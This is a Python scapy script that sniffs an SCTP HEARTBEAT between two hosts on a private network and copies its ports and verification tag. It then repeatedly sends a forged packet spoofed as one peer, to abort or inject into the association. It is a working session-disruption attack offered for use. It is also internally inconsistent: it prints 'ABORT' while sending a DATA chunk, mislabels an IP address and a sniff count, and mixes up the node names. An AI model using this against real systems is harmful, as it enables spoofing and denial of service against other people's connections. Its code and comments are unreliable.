from scapy.all import *
import time

# Function to check if a packet is an SCTP HEARTBEAT from Node S to Node C
def is_heartbeat_packet(pkt):
    return ((SCTP in pkt) and
            (SCTPChunkHeartbeatReq in pkt) and
            (pkt[IP].src == "10.10.10.7") and
            (pkt[IP].dst == "10.10.10.155"))

# Step 1: Monitor and capture a HEARTBEAT packet
print("Monitoring network for SCTP HEARTBEAT packet from 10.10.10.7 to 10.10.1.155...")
packets = sniff(iface="enp0s8", filter="sctp", prn=lambda x: x, stop_filter=is_heartbeat_packet, count=4)


if not packets:
    print("No HEARTBEAT packet captured. Exiting.")
    exit(1)

# Extract the first captured packet
for i in range(0, 3):
    heartbeat_pkt = packets[i]
    if (SCTPChunkHeartbeatReq in heartbeat_pkt)and(heartbeat_pkt[IP].src == "10.10.10.7"): break

# Extract and print required fields

src_mac = heartbeat_pkt[Ether].src
dst_mac = heartbeat_pkt[Ether].dst
src_ip = heartbeat_pkt[IP].src
dst_ip = heartbeat_pkt[IP].dst
src_port = heartbeat_pkt[SCTP].sport
dst_port = heartbeat_pkt[SCTP].dport
vtag = heartbeat_pkt[SCTP].tag

print("\nCaptured HEARTBEAT packet details:")
print(f"Source MAC: {src_mac}")
print(f"Destination MAC: {dst_mac}")
print(f"Source IP: {src_ip}")
print(f"Destination IP: {dst_ip}")
print(f"Source Port: {src_port}")
print(f"Destination Port: {dst_port}")
print(f"Verification Tag: {vtag:#010x}")

# Step 2: Sniffing stops automatically due to count=1

# Step 3: Construct SCTP ABORT packet
abort_pkt = (
    Ether(src=src_mac, dst=dst_mac) /
    IP(src="10.10.10.7", dst="10.10.10.155", id=0x0000, flags="DF") /
    SCTP(sport=src_port, dport=dst_port, tag=vtag) /
    #SCTPChunkAbort(TCB=1)
    #SCTPChunkShutdown()
    SCTPChunkData()
)

print("\nABORT packet parameters:")
print(f"Source IP: 10.10.10.7 (spoofed as Node C)")
print(f"Destination IP: 10.10.10.155 (Node S)")
print(f"Source Port: {src_port}")
print(f"Destination Port: {dst_port}")
print(f"Verification Tag: {vtag:#010x}")
print("Chunk Type: ABORT")

# Step 4: Send the ABORT packet to Node S
print("\nSending ABORT packet to Node S (10.10.10.155)...")

for i in range(1, 31):
    sendp(abort_pkt, verbose=False, iface="enp0s8")
    print(f"{i} - ABORT packet sent.\n")
    time.sleep(2)